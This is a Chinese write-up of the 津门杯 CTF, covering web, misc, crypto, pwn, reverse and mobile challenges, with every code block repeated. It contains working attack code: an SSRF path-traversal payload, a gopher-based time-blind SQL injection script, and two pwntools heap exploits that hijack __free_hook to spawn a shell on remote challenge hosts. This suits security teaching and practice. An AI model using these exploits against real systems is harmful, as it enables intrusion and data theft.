# 津⻔杯-WriteUp

> 原文: https://www.ctfiot.com/1992.html
> ID: 1992

WEB

.index.php.swp下源码，之后反序列化，flflag双写绕过就⾏了

{"url":"http://127.0.0.1:1234//127.0.0.1/index.php? file=/flag&id=../../../../../6438c669e0d0de98e6929c2cc0fac474"}

import requests
import string
from urllib import parse
import time
import string

charset = "," + string.ascii_lowercase + string.digits + string.ascii_uppercase

charset = ",@" + string.ascii_letters
def send(post):
    post_len = len(post)
    post = parse.quote(post)
    exp = f"gopher://127.0.0.1:80/_POST%20%2Fadmin.php%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AConnection%3A%20close%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%20{post_len}%0D%0A%0D%0A{post}"
    exp = exp.replace("%", "%25")

    url = f"http://121.36.147.29:20001/?url={exp}"
    start_time  = time.time()
    try:
        r = requests.get(url, timeout=0.3)
    except requests.exceptions.ReadTimeout:
        return 0.3
    stop_time  = time.time()
    return stop_time - start_time

result = ""
sql = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
for i in range(1,50):
    for c in charset:
        post = f"poc=mid(({sql}),{i},1)='{c}' and sleep(1) "
        t = send(post)
        # print(i,c,t)
        if t >= 0.3:
            result += c
            print(result)
            break

emails,flag,referers,uagents,users

MISC

| m0usb

00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:21:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1e:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1f:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1e:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1e:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1f:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1e:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:21:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1f:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:21:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1e:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:21:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1f:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1e:00:00:00:00:00
00:00:00:00:00:00:00:00

#!/usr/bin/env python
# -*- coding:utf-8 -*-

normalKeys = {"04":"a", "05":"b", "06":"c", "07":"d", "08":"e", "09":"f", "0a":"g", "0b":"h", "0c":"i", "0d":"j", "0e":"k", "0f":"l", "10":"m", "11":"n", "12":"o", "13":"p", "14":"q", "15":"r", "16":"s", "17":"t", "18":"u", "19":"v", "1a":"w", "1b":"x", "1c":"y", "1d":"z","1e":"1", "1f":"2", "20":"3", "21":"4", "22":"5", "23":"6","24":"7","25":"8","26":"9","27":"0","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"t","2c":"<SPACE>","2d":"-","2e":"=","2f":"[","30":"]","31":"\","32":"<NON>","33":";","34":"'","35":"<GA>","36":",","37":".","38":"/","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
shiftKeys = {"04":"A", "05":"B", "06":"C", "07":"D", "08":"E", "09":"F", "0a":"G", "0b":"H", "0c":"I", "0d":"J", "0e":"K", "0f":"L", "10":"M", "11":"N", "12":"O", "13":"P", "14":"Q", "15":"R", "16":"S", "17":"T", "18":"U", "19":"V", "1a":"W", "1b":"X", "1c":"Y", "1d":"Z","1e":"!", "1f":"@", "20":"#", "21":"$", "22":"%", "23":"^","24":"&","25":"*","26":"(","27":")","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"t","2c":"<SPACE>","2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"<NON>","33":""","34":":","35":"<GA>","36":"<","37":">","38":"?","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
output = []
keys = open('usbdata.txt')
for line in keys:
    try:
        if line[0]!='0' or (line[1]!='0' and line[1]!='2') or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0' or line[6:8]=="00":
             continue
        if line[6:8] in normalKeys.keys():
            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]=='2']
        else:
            output += ['[unknown]']
    except:
        pass
keys.close()

flag=0
print("".join(output))
for i in range(len(output)):
    try:
        a=output.index('<DEL>')
        del output[a]
        del output[a-1]
    except:
        pass
for i in range(len(output)):
    try:
        if output[i]=="<CAP>":
            flag+=1
            output.pop(i)
            if flag==2:
                flag=0
        if flag!=0:
            output[i]=output[i].upper()
    except:
        pass
print ('output :' + "".join(output))

data = "884080810882108108821042084010421"

list = data.split('0')
print(list)

datalist=[]
def dlist(list):
    d = 0
    for i in list:
        for j in i:
            d += int(j)
        datalist.append(d)
        d=0
    return datalist
datalist = dlist(list)

def str(datalist):
    s=''
    for i in datalist:
        s += chr(i+64)
    return s
print(str(datalist))

ip.src_host == 192.168.1.103 and ip.dst == 8.8.8.8 and dns.qry.type==1

with open("./1.txt", "r") as f:
    x = f.readlines()

for i in x:
    i = i.strip() 
    l = 4 - len(i) % 4
    if l != 4:
        i += "="* l
    print(i)

def inttobin(a, n):
    ret = bin(a)[2:]
    while len(ret) < n:
        ret = '0' + ret
    return ret

table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

f = open("2.txt", "r")
tmpbin = ''
res = ''
line = f.readline()
while line:
    if line[-2] == '=':
        if line[-3] == '=':
            tmpbin += inttobin(table.index(line[-4]), 6)[2:]
        else:
            tmpbin += inttobin(table.index(line[-3]), 6)[4:]
    line = f.readline()
quotient = int(len(tmpbin)/8)
for i in range(quotient):
    res += chr(int(tmpbin[8*i:8*i+8], 2))
print(res)

Crypto

| RSA

e很大，果断wienerattack秒接

import ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator
import libnum

def hack_RSA(e,n):
    frac = ContinuedFractions.rational_to_contfrac(e, n)
    convergents = ContinuedFractions.convergents_from_contfrac(frac)

    for (k,d) in convergents:
        if k!=0 and (e*d-1)%k == 0:
            phi = (e*d-1)//k
            s = n - phi + 1
            discr = s*s - 4*n
            if(discr>=0):
                t = Arithmetic.is_perfect_square(discr)
                if t!=-1 and (s+t)%2==0:
                    print("Hacked!")
                    return d

if __name__ == "__main__":
    c=58703794202217708947284241025731347400180247075968200121227051434588274043273799724484183411072837136505848853313100468119277511144235171654313035776616454960333999039452491921144841080778960041199884823368775400603713982137807991048133794452060951251851183850000091036462977949122345066992308292574341196418
    e=119393861845960762048898683511487799317851579948448252137466961581627352921253771151013287722073113635185303441785456596647011121862839187775715967164165508224247084850825422778997956746102517068390036859477146822952441831345548850161988935112627527366840944972449468661697184646139623527967901314485800416727

    n=143197135363873763765271313889482832065495214476988244056602939316096558604072987605784826977177132590941852043292009336108553058140643889603639640376907419560005800390316898478577088950660088975625569277320455499051275696998681590010122458979436183639691126624402025651761740265817600604313205276368201637427
    d = hack_RSA(e, n)
    m = pow(c,d,n)
    print(libnum.n2s(m))

%2F102%2F108%2F97%2F103%2F123%2F113%2F49%2F120%2F75%2F112%2F109%2F56%2F118%2F73%2F76%2F87%2F114%2F107%2F109%2F88%2F120%2F86%2F54%2F106%2F49%2F49%2F77%2F100%2F99%2F71%2F116%2F76%2F122%2F118%2F82%2F121%2F86%2F125

PWN

#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
p = process('./hello')
#,env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
p = remote("119.3.81.43", 49153)
def add(num, name, size, content):
    p.sendlineafter(">>", "1")
    p.sendlineafter("umber:", num)
    p.sendlineafter("name:", name)
    p.sendlineafter("size:", str(size))
    p.sendafter("info:", content)
def show(idx):
    p.sendlineafter(">>", "3")
    p.sendlineafter(" index:", str(idx))
def edit(idx, num, name, content):
    p.sendlineafter(">>", "4")
    p.sendlineafter("ndex:", str(idx))
    p.sendlineafter("umber:", num)
    p.sendlineafter("name:", name)
    p.sendafter("info:", content)
def delete(idx):
    p.sendlineafter(">>", "2")
    p.sendlineafter(" index:", str(idx))

def exp():
    add("123", "aaa", 0x80,  "An")
    add("123", "aaa", 0x20, "an")
    delete(0)
    add("123", "aaa", 0x7, "a"*8)
    show(2)
    p.recvuntil("a"*8)
    libc.address= u64(p.recv(6)+'x00'*2)-0x00007ffff7dd1bf8+0x7ffff7a0d000
    print hex(libc.address)
    edit(1, "a", "a"*13+p64(libc.sym['__free_hook']), p64(libc.sym['system'])+'n')
    add("123", "aaa", 0x20, "/bin/shn")
    delete(3)

    p.interactive()
if __name__ == '__main__':
    exp()

from pwn import * 
context.log_level = 'debug'
#p = process("./pwn")
libc = ELF("./libc.so.6")
p = remote("119.3.81.43", 49155)
def add(name, size, des, score):
    p.sendlineafter(">>", "1")
    p.sendlineafter(" name:", name)
    p.sendlineafter("size:", str(size))
    p.sendlineafter("des:", des)
    p.sendlineafter("score:", str(score))
def free(idx):
    p.sendlineafter(">>", "2")
    p.sendlineafter("index:", str(idx))
def show(idx):
    p.sendlineafter(">>", "3")
    p.sendlineafter("index:", str(idx))
p.sendlineafter("name:", "CTFM")
p.sendlineafter("password:", "123456")
add("11", 0xf0, "a", 111)#0
add("11", 0x18, "a", 111)#1
add("11", 0x18, "a", 111)
free(2)
for i in range(8):
    add("11", 0xf0, "a", 111)#2
for i in range(3, 10):
    free(i)
add("11", 0x18, "A", 111)#3

free(0)
free(3)
add("11", 0x18, b"a"*0x18, 111)
free(0)

for i in range(6):
     free(0)
     add("11", 0x18, b"A"*(0x10+7-i), 111)
free(0)

add("11", 0x18, b"A"*(0x10)+p64(0x140), 111)
free(2)
for i in range(8):    
    add("11", 0xf0, "a", 111)#1
show(1)
p.recvuntil("des:")
libc.address = u64(p.recv(6)+b'x00'*2)-0x00007ffff7dcfca0+0x7ffff79e4000
print(hex(libc.address))
free(7)
free(8)
free(9)
free(0)

add("11", 0x50, b"A"*0x20+p64(libc.sym['__free_hook'])+p64(0), 111)
add("11", 0x10, b"/bin/shx00", 111)
add("11", 0x10, p64(libc.sym['system']), 111)
free(7)

p.interactive()

Reverse

function BitXOR(a,b)
    local p,c=1,0
    while a>0 and b>0 do
        local ra,rb=a%2,b%2
        if ra~=rb then c=c+p end
        a,b,p=(a-ra)/2,(b-rb)/2,p*2
    end
    if a<b then a=b end
    while a>0 do
        local ra=a%2
        if ra>0 then c=c+p end
        a,p=(a-ra)/2,p*2
    end
    return c
end

function adcdefg(j)
    return BitXOR(5977654,j)
end

from z3 import *

dest_enc=[0x005B360D, 0x00000177, 0x005B377B, 0x00000E0A, 0x005B379A, 0x00000371, 0x005B3842, 0x000003EC, 0x005B3A6E, 0x0000046B, 0x005B3ADC, 0x0000010B, 0x005B386E, 0x00000B11, 0x005B350A, 0x00000FE0, 0x005B226B, 0x00001483, 0x005B3EAB, 0x000010C5, 0x005B1742, 0x00000F85, 0x005B388F, 0x000013E2, 0x005B3C54, 0x000010AA, 0x005B3A05, 0x00000CE3, 0x005B36C7, 0x0000159D, 0x005B3949, 0x144e]

for seed in range(0xfff):
    xor_data = []

    for i in range(33):
        r = (0x1ED0675 * seed + 0x6c1) % 0xfe
        xor_data.append(r)
        seed = r

    s=Solver()

    flag = [BitVec(('x%d' % i), 8) for i in range(32)]
    xor_result = [0 for i in range(64)]
    for i in range(32):
        for j in range(33):
            a = flag[i] ^ xor_data[j]
            xor_result[i + j] += a
            xor_result[i+j]=(xor_result[i+j]^5977654)

    for i in range(0, 32):
        s.add(flag[i]<=127)
        s.add(flag[i]>=32)
        s.add(xor_result[i] == dest_enc[i])

    if s.check() == sat:
        model = s.model()
        str = [chr(model[flag[i]].as_long().real) for i in range(32)]
        print("".join(str))
        exit()

Mobile

frida脱壳得到dex 

核⼼代码中存在⼀个加密，本质是个多项式

a:三个随机数
k:用户输入
b:7个随机数
res=k+(a[0]*b[i]+a[1]*(b[i])**2+a[2]*(b[i])**3)

from z3 import *1 
from Crypto.Util.number import long_to_bytes  

k = Int('k') 
a = [Int(str(i)) for i in range(3)] 
s = Solver() 
c = [     
    33933,46752,55441,31627,    
    60334,50033,63748 
] 
r = [    
2463002213239249478421333914949520,     
2463002213407298387897683677526162,    
2463002213588939042437173015220224,     
2463002213219449031157189171389412,     
2463002213719983401596195542989712,    
2463002213468695035757250868133120,     
2463002213824972784058087693515910 
] 
for i in range(7):     
    s.add(k + a[0] * c[i] + a[1] * c[i] ** 2 + a[2] * c[i] ** 3 == r[i])  
if s.check()==sat:     
   print(s.model())    
   key = s.model()[k].as_long()   
   print(long_to_bytes(key))

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
{"url":"http://127.0.0.1:1234//127.0.0.1/index.php? file=/flag&id=../../../../../6438c669e0d0de98e6929c2cc0fac474"}
```



```
import requests
import string
from urllib import parse
import time
import string

charset = "," + string.ascii_lowercase + string.digits + string.ascii_uppercase

charset = ",@" + string.ascii_letters
def send(post):
    post_len = len(post)
    post = parse.quote(post)
    exp = f"gopher://127.0.0.1:80/_POST%20%2Fadmin.php%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AConnection%3A%20close%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%20{post_len}%0D%0A%0D%0A{post}"
    exp = exp.replace("%", "%25")

    url = f"http://121.36.147.29:20001/?url={exp}"
    start_time  = time.time()
    try:
        r = requests.get(url, timeout=0.3)
    except requests.exceptions.ReadTimeout:
        return 0.3
    stop_time  = time.time()
    return stop_time - start_time

result = ""
sql = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
for i in range(1,50):
    for c in charset:
        post = f"poc=mid(({sql}),{i},1)='{c}' and sleep(1) "
        t = send(post)
        # print(i,c,t)
        if t >= 0.3:
            result += c
            print(result)
            break
```



```
emails,flag,referers,uagents,users
```



```
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:21:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1e:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1f:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1e:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1e:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1f:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1e:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:21:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1f:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:21:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1e:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:21:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1f:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:1e:00:00:00:00:00
00:00:00:00:00:00:00:00
```



```
#!/usr/bin/env python
# -*- coding:utf-8 -*-

normalKeys = {"04":"a", "05":"b", "06":"c", "07":"d", "08":"e", "09":"f", "0a":"g", "0b":"h", "0c":"i", "0d":"j", "0e":"k", "0f":"l", "10":"m", "11":"n", "12":"o", "13":"p", "14":"q", "15":"r", "16":"s", "17":"t", "18":"u", "19":"v", "1a":"w", "1b":"x", "1c":"y", "1d":"z","1e":"1", "1f":"2", "20":"3", "21":"4", "22":"5", "23":"6","24":"7","25":"8","26":"9","27":"0","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"t","2c":"<SPACE>","2d":"-","2e":"=","2f":"[","30":"]","31":"\","32":"<NON>","33":";","34":"'","35":"<GA>","36":",","37":".","38":"/","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
shiftKeys = {"04":"A", "05":"B", "06":"C", "07":"D", "08":"E", "09":"F", "0a":"G", "0b":"H", "0c":"I", "0d":"J", "0e":"K", "0f":"L", "10":"M", "11":"N", "12":"O", "13":"P", "14":"Q", "15":"R", "16":"S", "17":"T", "18":"U", "19":"V", "1a":"W", "1b":"X", "1c":"Y", "1d":"Z","1e":"!", "1f":"@", "20":"#", "21":"$", "22":"%", "23":"^","24":"&","25":"*","26":"(","27":")","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"t","2c":"<SPACE>","2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"<NON>","33":""","34":":","35":"<GA>","36":"<","37":">","38":"?","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
output = []
keys = open('usbdata.txt')
for line in keys:
    try:
        if line[0]!='0' or (line[1]!='0' and line[1]!='2') or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0' or line[6:8]=="00":
             continue
        if line[6:8] in normalKeys.keys():
            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]=='2']
        else:
            output += ['[unknown]']
    except:
        pass
keys.close()

flag=0
print("".join(output))
for i in range(len(output)):
    try:
        a=output.index('<DEL>')
        del output[a]
        del output[a-1]
    except:
        pass
for i in range(len(output)):
    try:
        if output[i]=="<CAP>":
            flag+=1
            output.pop(i)
            if flag==2:
                flag=0
        if flag!=0:
            output[i]=output[i].upper()
    except:
        pass
print ('output :' + "".join(output))

data = "884080810882108108821042084010421"

list = data.split('0')
print(list)

datalist=[]
def dlist(list):
    d = 0
    for i in list:
        for j in i:
            d += int(j)
        datalist.append(d)
        d=0
    return datalist
datalist = dlist(list)

def str(datalist):
    s=''
    for i in datalist:
        s += chr(i+64)
    return s
print(str(datalist))
```



```
ip.src_host == 192.168.1.103 and ip.dst == 8.8.8.8 and dns.qry.type==1
```



```
with open("./1.txt", "r") as f:
    x = f.readlines()

for i in x:
    i = i.strip() 
    l = 4 - len(i) % 4
    if l != 4:
        i += "="* l
    print(i)
```



```
def inttobin(a, n):
    ret = bin(a)[2:]
    while len(ret) < n:
        ret = '0' + ret
    return ret

table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

f = open("2.txt", "r")
tmpbin = ''
res = ''
line = f.readline()
while line:
    if line[-2] == '=':
        if line[-3] == '=':
            tmpbin += inttobin(table.index(line[-4]), 6)[2:]
        else:
            tmpbin += inttobin(table.index(line[-3]), 6)[4:]
    line = f.readline()
quotient = int(len(tmpbin)/8)
for i in range(quotient):
    res += chr(int(tmpbin[8*i:8*i+8], 2))
print(res)
```



```
import ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator
import libnum

def hack_RSA(e,n):
    frac = ContinuedFractions.rational_to_contfrac(e, n)
    convergents = ContinuedFractions.convergents_from_contfrac(frac)

    for (k,d) in convergents:
        if k!=0 and (e*d-1)%k == 0:
            phi = (e*d-1)//k
            s = n - phi + 1
            discr = s*s - 4*n
            if(discr>=0):
                t = Arithmetic.is_perfect_square(discr)
                if t!=-1 and (s+t)%2==0:
                    print("Hacked!")
                    return d

if __name__ == "__main__":
    c=58703794202217708947284241025731347400180247075968200121227051434588274043273799724484183411072837136505848853313100468119277511144235171654313035776616454960333999039452491921144841080778960041199884823368775400603713982137807991048133794452060951251851183850000091036462977949122345066992308292574341196418
    e=119393861845960762048898683511487799317851579948448252137466961581627352921253771151013287722073113635185303441785456596647011121862839187775715967164165508224247084850825422778997956746102517068390036859477146822952441831345548850161988935112627527366840944972449468661697184646139623527967901314485800416727

    n=143197135363873763765271313889482832065495214476988244056602939316096558604072987605784826977177132590941852043292009336108553058140643889603639640376907419560005800390316898478577088950660088975625569277320455499051275696998681590010122458979436183639691126624402025651761740265817600604313205276368201637427
    d = hack_RSA(e, n)
    m = pow(c,d,n)
    print(libnum.n2s(m))
```



```
%2F102%2F108%2F97%2F103%2F123%2F113%2F49%2F120%2F75%2F112%2F109%2F56%2F118%2F73%2F76%2F87%2F114%2F107%2F109%2F88%2F120%2F86%2F54%2F106%2F49%2F49%2F77%2F100%2F99%2F71%2F116%2F76%2F122%2F118%2F82%2F121%2F86%2F125
```



```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
p = process('./hello')
#,env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
p = remote("119.3.81.43", 49153)
def add(num, name, size, content):
    p.sendlineafter(">>", "1")
    p.sendlineafter("umber:", num)
    p.sendlineafter("name:", name)
    p.sendlineafter("size:", str(size))
    p.sendafter("info:", content)
def show(idx):
    p.sendlineafter(">>", "3")
    p.sendlineafter(" index:", str(idx))
def edit(idx, num, name, content):
    p.sendlineafter(">>", "4")
    p.sendlineafter("ndex:", str(idx))
    p.sendlineafter("umber:", num)
    p.sendlineafter("name:", name)
    p.sendafter("info:", content)
def delete(idx):
    p.sendlineafter(">>", "2")
    p.sendlineafter(" index:", str(idx))

def exp():
    add("123", "aaa", 0x80,  "An")
    add("123", "aaa", 0x20, "an")
    delete(0)
    add("123", "aaa", 0x7, "a"*8)
    show(2)
    p.recvuntil("a"*8)
    libc.address= u64(p.recv(6)+'x00'*2)-0x00007ffff7dd1bf8+0x7ffff7a0d000
    print hex(libc.address)
    edit(1, "a", "a"*13+p64(libc.sym['__free_hook']), p64(libc.sym['system'])+'n')
    add("123", "aaa", 0x20, "/bin/shn")
    delete(3)

    p.interactive()
if __name__ == '__main__':
    exp()
```



```
from pwn import * 
context.log_level = 'debug'
#p = process("./pwn")
libc = ELF("./libc.so.6")
p = remote("119.3.81.43", 49155)
def add(name, size, des, score):
    p.sendlineafter(">>", "1")
    p.sendlineafter(" name:", name)
    p.sendlineafter("size:", str(size))
    p.sendlineafter("des:", des)
    p.sendlineafter("score:", str(score))
def free(idx):
    p.sendlineafter(">>", "2")
    p.sendlineafter("index:", str(idx))
def show(idx):
    p.sendlineafter(">>", "3")
    p.sendlineafter("index:", str(idx))
p.sendlineafter("name:", "CTFM")
p.sendlineafter("password:", "123456")
add("11", 0xf0, "a", 111)#0
add("11", 0x18, "a", 111)#1
add("11", 0x18, "a", 111)
free(2)
for i in range(8):
    add("11", 0xf0, "a", 111)#2
for i in range(3, 10):
    free(i)
add("11", 0x18, "A", 111)#3

free(0)
free(3)
add("11", 0x18, b"a"*0x18, 111)
free(0)

for i in range(6):
     free(0)
     add("11", 0x18, b"A"*(0x10+7-i), 111)
free(0)

add("11", 0x18, b"A"*(0x10)+p64(0x140), 111)
free(2)
for i in range(8):    
    add("11", 0xf0, "a", 111)#1
show(1)
p.recvuntil("des:")
libc.address = u64(p.recv(6)+b'x00'*2)-0x00007ffff7dcfca0+0x7ffff79e4000
print(hex(libc.address))
free(7)
free(8)
free(9)
free(0)

add("11", 0x50, b"A"*0x20+p64(libc.sym['__free_hook'])+p64(0), 111)
add("11", 0x10, b"/bin/shx00", 111)
add("11", 0x10, p64(libc.sym['system']), 111)
free(7)

p.interactive()
```



```
function BitXOR(a,b)
    local p,c=1,0
    while a>0 and b>0 do
        local ra,rb=a%2,b%2
        if ra~=rb then c=c+p end
        a,b,p=(a-ra)/2,(b-rb)/2,p*2
    end
    if a<b then a=b end
    while a>0 do
        local ra=a%2
        if ra>0 then c=c+p end
        a,p=(a-ra)/2,p*2
    end
    return c
end

function adcdefg(j)
    return BitXOR(5977654,j)
end
```



```
from z3 import *

dest_enc=[0x005B360D, 0x00000177, 0x005B377B, 0x00000E0A, 0x005B379A, 0x00000371, 0x005B3842, 0x000003EC, 0x005B3A6E, 0x0000046B, 0x005B3ADC, 0x0000010B, 0x005B386E, 0x00000B11, 0x005B350A, 0x00000FE0, 0x005B226B, 0x00001483, 0x005B3EAB, 0x000010C5, 0x005B1742, 0x00000F85, 0x005B388F, 0x000013E2, 0x005B3C54, 0x000010AA, 0x005B3A05, 0x00000CE3, 0x005B36C7, 0x0000159D, 0x005B3949, 0x144e]

for seed in range(0xfff):
    xor_data = []

    for i in range(33):
        r = (0x1ED0675 * seed + 0x6c1) % 0xfe
        xor_data.append(r)
        seed = r

    s=Solver()

    flag = [BitVec(('x%d' % i), 8) for i in range(32)]
    xor_result = [0 for i in range(64)]
    for i in range(32):
        for j in range(33):
            a = flag[i] ^ xor_data[j]
            xor_result[i + j] += a
            xor_result[i+j]=(xor_result[i+j]^5977654)

    for i in range(0, 32):
        s.add(flag[i]<=127)
        s.add(flag[i]>=32)
        s.add(xor_result[i] == dest_enc[i])

    if s.check() == sat:
        model = s.model()
        str = [chr(model[flag[i]].as_long().real) for i in range(32)]
        print("".join(str))
        exit()
```



```
a:三个随机数
k:用户输入
b:7个随机数
res=k+(a[0]*b[i]+a[1]*(b[i])**2+a[2]*(b[i])**3)
```



```
from z3 import *1 
from Crypto.Util.number import long_to_bytes  

k = Int('k') 
a = [Int(str(i)) for i in range(3)] 
s = Solver() 
c = [     
    33933,46752,55441,31627,    
    60334,50033,63748 
] 
r = [    
2463002213239249478421333914949520,     
2463002213407298387897683677526162,    
2463002213588939042437173015220224,     
2463002213219449031157189171389412,     
2463002213719983401596195542989712,    
2463002213468695035757250868133120,     
2463002213824972784058087693515910 
] 
for i in range(7):     
    s.add(k + a[0] * c[i] + a[1] * c[i] ** 2 + a[2] * c[i] ** 3 == r[i])  
if s.check()==sat:     
   print(s.model())    
   key = s.model()[k].as_long()   
   print(long_to_bytes(key))
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/10-1634877749.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/7-1634877750.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/7-1634877750-1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/8-1634877750.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/6-1634877751.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/0-1634877751.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/4-1634877752.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/4-1634877752-1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/9-1634877752.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/8-1634877753.png)